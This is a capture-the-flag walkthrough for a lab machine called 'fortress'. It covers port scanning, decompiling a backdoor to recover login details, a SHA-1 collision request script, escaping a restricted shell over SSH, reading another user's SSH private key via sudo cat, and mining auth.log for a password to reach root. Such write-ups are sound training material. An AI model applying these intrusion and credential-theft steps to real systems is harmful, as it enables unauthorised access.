> [!TIP]
> Hints from the CTF description:
> 
> * `10.49.189.92    fortress` 
> * `10.49.189.92    temple.fortress`

# 1. Initial Scanning

## 1.1 TCP Scan

**Top 1000s scan**

> **Input**

`nmap -sC -sV -oA initial_port_scan 10.49.189.92`

> **Output**

```text
PORT    STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:d0:bb:c7:e2:ee:7f:91:fe:c2:6a:a6:bb:b2:e1:91 (RSA)
|   256 06:4b:fe:c0:6e:e4:f4:7e:e1:db:1c:e7:79:9d:2b:1d (ECDSA)
|_  256 0d:0e:ce:57:00:1a:e2:8d:d2:1b:2e:6d:92:3e:65:c4 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!NOTE]
> * **Port 22/tcp** Open SSH 7.2p2 running
> * **Observations:** OS is Ubuntu 

**Full scan**

> **Input**

`nmap -p- --min-rate=1000 -oA full_port_scan 10.49.189.92`

> **Output**

```text
PORT     STATE SERVICE
22/tcp   open  ssh
5581/tcp open  tmosms1
5752/tcp open  unknown
7331/tcp open  swx
```

**High ports detailed scan**

> **Input**

```bash
nmap -p 5581,5752,7331 -sC -sV 10.49.189.92          
```

> **Output**

```text
PORT     STATE SERVICE VERSION
5581/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp       ftp            305 Jul 25  2021 marked.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|       Connected to ::ffff:192.168.162.113
|       Logged in as ftp
|       TYPE: ASCII
|       No session bandwidth limit
|       Session timeout in seconds is 300
|       Control connection is plain text
|       Data connections will be plain text
|       At session startup, client count was 1
|       vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5752/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LANDesk-RC, LPDString, RTSPRequest, SIPOptions, X11Probe: 
|      Chapter 1: A Call for help
|      Username: Password:
|   Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie: 
|      Chapter 1: A Call for help
|_    Username:
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

> [!NOTE]
>- **Port 5581/tcp** running FTP vsftp 3.0.3 **Anonymous login enabled**
>- **Port 7331/tcp** running Apache httpd 2.4.18
>- **Port 5752/tcp** unrecognized service asking for credentials

**Port 5752/tcp manual recon**

We use netcat to interact with the port.

> **Input**

```bash
netcat -nv 10.49.189.92 5752      
```

> **Output**

```text
(UNKNOWN) [10.49.189.92] 5752 (?) open

         Chapter 1: A Call for help

Username: root
Password: root
Errr... Authentication failed
```

> [!NOTE]
> We find a customized port that asks for credentials to log-in. We try with root:root but it fails.

## 1.2 UDP Scan

> **Input**

`sudo nmap -sU --top-ports 100 [TARGET_IP]`

> **Output**

```text
PORT    STATE          SERVICE
68/udp open|filtered dhcpc
```

> [!NOTE]
> - Only dhcpc open in **port 68/udp**, not very relevant.

# 2. Service Enumeration

## 2.1 FTP in port 5581
### 2.1.1 Manual Exploration

We log in with anonymous credentials:

> **Input**

```bash
ftp anonymous@10.49.189.92 5581
```

In the available directory we run `ls -la` and we find two files `marked.txt` and  `.file`.

`marked.txt` contains this text:

```text
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

Here we find an account id `veekay`, which may be useful for later. We also try to log into FTP with that account but the service only accepts anonymous logins.

`.file`

This file looks like a compiled file, so we check it with `file .file`, which returns `file: python 2.7 byte-compiled`. Then we rename it to `file.pyc` and decompile it using `uncompyle6 file.pyc > decompiled_file`.

The decompiled file looks like this:
```python
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0]
# Embedded file name: ../backdoor/backdoor.py
# Compiled at: 2021-04-28 22:56:57
import socket, subprocess
from Crypto.Util.number import bytes_to_long
usern = 232340432076717036154994L
passw = 10555160959732308261529999676324629831532648692669445488L
port = 5752
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
s.listen(10)
# ... [SNIPPED FOR BREVITY] ...
```

This file corresponds to the service running on port **5752** (seen in the socket binding `port = 5752`). This gives us access to the logic for the "backdoor."

The credentials are displayed in big-endian, so we decode them:
```text
Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up
```

> [!NOTE]
> We find credentials for port 5752 service:
> - Username: 1337-h4x0r
> - Password: n3v3r_g0nn4_g1v3_y0u_up
>
> Additionally, we find an account id inside `marked.txt`: `/home/veekay`

## 2.2 Custom service in port 5752

### 2.2.1 Manual exploration

We use netcat to connect to this port again, now with valid credentials:

```bash
nc -nv 10.49.189.92 5752
```

After entering the credentials found in `file.pyc`, the service responds:
`t3mple_0f_y0ur_51n5`

> [!NOTE]
> We retrieve the string `t3mple_0f_y0ur_51n5`. This looks like a hidden directory or a password. We will use this for further web enumeration.

## 2.3 HTTP Apache server in port 7331

### 2.3.1 Directory Scan

**`Common.txt` basic scan**

> **Input**

```bash
gobuster dir -u http://fortress:7331 -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt
```

> **Output**

```text
.htpasswd            (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 10918]
private.php          (Status: 200) [Size: 0]
server-status        (Status: 403) [Size: 275]
```

> [!NOTE]
> Nothing interesting here, just standard Apache noise.

### 2.3.2 Subdomain/VHost Scan

> [!TIP]
> We already know the subdomain `temple.fortress` from the CTF description.

**Scan with known string**

Recalling the string `t3mple_0f_y0ur_51n5` found in the backdoor service (Port 5752), we attempt to access it as a resource on the web server.

We verify the existence of `http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php`.

> [!IMPORTANT]
> We confirm that `t3mple_0f_y0ur_51n5.php` exists.
> Additionally, we inspect the source code of the main page and find a reference to `/t3mpl3_0f_y0ur_51n5.html`, which contains the PHP source code for the login logic.

# 3. Vulnerability Assessment

## 3.1 `/t3mpl3_0f_y0ur_51n5.php` (SHA1 Collision)

We analyzed the leaked PHP source code:

```php
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
    $test1 = (string)$_GET['user'];
    $test2 = (string)$_GET['pass'];
    
    // ... [Checks for bad chars and length] ...

    else if (sha1($test1) === sha1($test2)) {
      print "<pre>'Private Spot: '$spot</pre>";
    } 
}
?>
```

The challenge requires a **SHA-1 Collision**. The criteria are:
* user != pass
* user >= 600 char & pass >= 500 char
* No instance of '000000' in the hex representation
* sha1(user) == sha1(pass)

We used a known SHAttered collision prefix and wrote a Python script to send the payload.

> **Exploit Script (Snippet)**

```python
import requests
import hashlib
import binascii

url = '[http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php](http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php)'

# Hex strings (SHAttered PDFs with slight variations)
# [truncated for readability]
hex_user = ("255044462D312E330A25E2E3CFD30A0A0A312030206F626A...[SNIP]...7363726970743E0A0A")
hex_pass = ("255044462D312E330A25E2E3CFD30A0A0A312030206F626A...[SNIP]...7363726970743E0A0A")

# Convert hex to binary
user_bin = binascii.unhexlify(hex_user.replace(" ", ""))
pass_bin = binascii.unhexlify(hex_pass.replace(" ", ""))

# Execute request
if h1 == h2 and user_bin != pass_bin:
    params = {'user': user_bin, 'pass': pass_bin}
    try:
        r = requests.get(url, params=params)
        print("\n--- Server Response ---")
        print(r.text)
    except Exception as e:
        print(f"Error: {e}")
```

> [!IMPORTANT]
> The script works and we get the next hint: `m0td_f0r_j4x0n.txt`
> We access this file and retrieve the **SSH private key for h4rdy**.

# 4. Privilege Escalation

## 4.1 Lateral Movement 

**h4rdy**

Using the SSH key obtained, we log in as `h4rdy`.

```bash
ssh -i h4rdy_ssh h4rdy@temple.fortress
```

We land in a restricted shell (`rbash`). The `PATH` is broken (set to `/home/myuser/`), and we cannot use output redirection (`>`) or standard binaries like `ls`.

We use built-in enumeration techniques to map the system:
* `echo /home/*`
* `echo /home/.*`
* `while read line; do echo $line; done < /home/user/key.txt`

During manual recon, we find `data/setup.sh`. This file appears to be a leftover configuration script containing flags and passwords.

> [!IMPORTANT]
> While `data/setup.sh` contains the answers, we proceed with the intended exploitation method to break the restricted shell properly.

**Escaping RBash**

Since we have the private key, we can bypass the restricted profile loading by forcing a shell command during the SSH connection:

```bash
ssh -i h4rdy_ssh h4rdy@10.48.158.28 -t "bash --noprofile"
```

This prevents the loading of `.bash_profile` (which sets the restricted PATH). Once inside, we fix the environment:

```bash
export PATH=/bin:/usr/bin:$PATH
```

Now we have a fully functional shell. We check sudo permissions with `sudo -l` and find we can run `/bin/cat` as the user **j4x0n**. We use this to retrieve the flag and j4x0n's private key:

```bash
sudo -u j4x0n /bin/cat /home/j4x0n/user.txt
sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa
```

## 4.2 Vertical Escalation

**j4x0n**

We SSH into the box as `j4x0n` using the retrieved key. We check the user's group memberships:

```bash
id
# uid=1000(j4x0n) gid=1000(j4x0n) groups=1000(j4x0n),4(adm),...
```

The user is a member of the **adm** group. This allows us to read system logs. We grep `/var/log/auth.log` for passwords:

```bash
cat /var/log/auth.log | grep pass
```

We find a log entry where a password was changed via command line:
`COMMAND=/bin/bash -c echo "j4x0n:yoU_c@nt_guess_1t_in_zillion_years" | chpasswd`

We now have the password for `j4x0n`. We check `sudo -l` for this user and find they have full sudo access.

> [!IMPORTANT]
> We verify root access and retrieve the final flag:
> ```bash
> sudo su
> id
> # uid=0(root) gid=0(root) groups=0(root)
> cat /root/root.txt
> ```
